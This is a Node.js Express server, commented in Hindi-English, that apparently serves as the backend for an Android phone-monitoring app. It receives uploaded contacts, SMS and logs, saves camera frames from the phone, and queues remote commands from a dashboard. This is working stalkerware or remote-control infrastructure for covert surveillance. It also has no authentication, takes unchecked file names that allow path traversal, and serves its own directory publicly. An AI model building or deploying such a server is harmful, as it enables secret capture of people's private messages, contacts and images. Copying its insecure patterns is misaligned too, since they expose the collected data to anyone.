const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// --- 1. SETTINGS ---
const UPLOADS_DIR = path.join(__dirname, 'uploads');

// Folder banao agar nahi hai
if (!fs.existsSync(UPLOADS_DIR)) {
    fs.mkdirSync(UPLOADS_DIR);
    console.log("📂 'uploads' folder created successfully.");
}

// Middleware (Size Badhaya taaki Photo aa sake)
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' })); 
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname));

// RAM Storage
let devices = {}; 

// ==================================================
// 📲 PHONE SIDE (Android App Yahan Baat Karega)
// ==================================================

// 1. STATUS UPDATE & COMMAND CHECK
// URL: https://.../api/update-status
app.post('/api/update-status', (req, res) => {
    // ⚠️ DHYAN DO: Android App 'charging' aur 'version' bhej raha hai
    const { device_id, model, battery, version, charging } = req.body; 

    const id = device_id || "Child_Phone_01";

    if (!devices[id]) devices[id] = {};
    
    // Command jo dashboard se bheji gayi thi
    const pendingCommand = devices[id].command || "";

    // Update Status
    devices[id] = {
        model: model || "Unknown",
        battery: battery || 0,
        version: version || "--", // 'android_version' nahi, 'version' match kiya
        charging: charging === 'true' || charging === true, // String/Boolean handling
        lastSeen: Date.now(),
        command: "" // Command bhej di, ab clear kar do
    };

    console.log(`📡 Ping from ${id} | Bat: ${battery}% | Command: ${pendingCommand}`);

    // Sirf Text Command wapas bhejo (Android App simple string expect kar raha hai)
    res.send(pendingCommand);
});

// 2. DATA UPLOAD (Contacts, SMS, Logs)
// URL: https://.../api/upload-data
app.post('/api/upload-data', (req, res) => {
    const { device_id, type, data } = req.body;
    const id = device_id || "Child_Phone_01";

    console.log(`📥 Data Received from ${id}: [${type}]`);

    // Android App JSON string bhejta hai, usse parse karo
    let parsedData;
    try {
        parsedData = typeof data === 'string' ? JSON.parse(data) : data;
    } catch (e) {
        parsedData = data;
    }

    const fileName = `${id}_${type}.json`;
    const filePath = path.join(UPLOADS_DIR, fileName);

    try {
        fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
        console.log(`✅ Saved to: ${fileName}`);
        res.send("success");
    } catch (error) {
        console.error("❌ Save Error:", error);
        res.status(500).send("error");
    }
});

// 3. CAMERA FRAME UPLOAD (Ye Tumhare Code me MISSING tha)
// URL: https://.../api/upload-frame
app.post('/api/upload-frame', (req, res) => {
    const { device_id, image_data } = req.body; // Android 'image_data' bhej raha hai
    const id = device_id || "Child_Phone_01";

    if (!image_data) {
        return res.status(400).send("No image data");
    }

    console.log(`📸 Image Received from ${id}`);

    // Base64 Image ko file banakar save karo
    const fileName = `${id}_cam_${Date.now()}.jpg`; // Har photo ka naya naam
    const filePath = path.join(UPLOADS_DIR, fileName);

    // "data:image/jpeg;base64," wala hissa hatao
    const base64Image = image_data.replace(/^data:image\/\w+;base64,/, "");

    fs.writeFile(filePath, base64Image, 'base64', (err) => {
        if (err) {
            console.error("❌ Image Save Error:", err);
            return res.status(500).send("error");
        }
        console.log(`✅ Photo Saved: ${fileName}`);
        res.send("success");
    });
});


// ==================================================
// 💻 DASHBOARD SIDE (Website Logic)
// ==================================================

app.get('/api/device-status/:id', (req, res) => {
    const id = req.params.id;
    const device = devices[id];

    if (!device) {
        return res.json({ isOnline: false, message: "Waiting..." });
    }

    const isOnline = (Date.now() - device.lastSeen) < 60000; // 60 sec timeout

    res.json({ ...device, isOnline });
});

app.post('/api/send-command', (req, res) => {
    const { device_id, command } = req.body;
    const id = device_id || "Child_Phone_01";

    if (!devices[id]) devices[id] = {};
    devices[id].command = command;
    
    console.log(`🚀 Command Queued: [${command}] for ${id}`);
    res.json({ status: "success", message: `Command '${command}' queued.` });
});

// Photo dekhne ke liye URL (Dashboard par <img> tag me use hoga)
app.get('/uploads/:filename', (req, res) => {
    const filePath = path.join(UPLOADS_DIR, req.params.filename);
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.status(404).send("File not found");
    }
});

// --- Server Start ---
app.listen(PORT, () => {
    console.log(`🔥 SERVER STARTED ON PORT ${PORT}`);
});
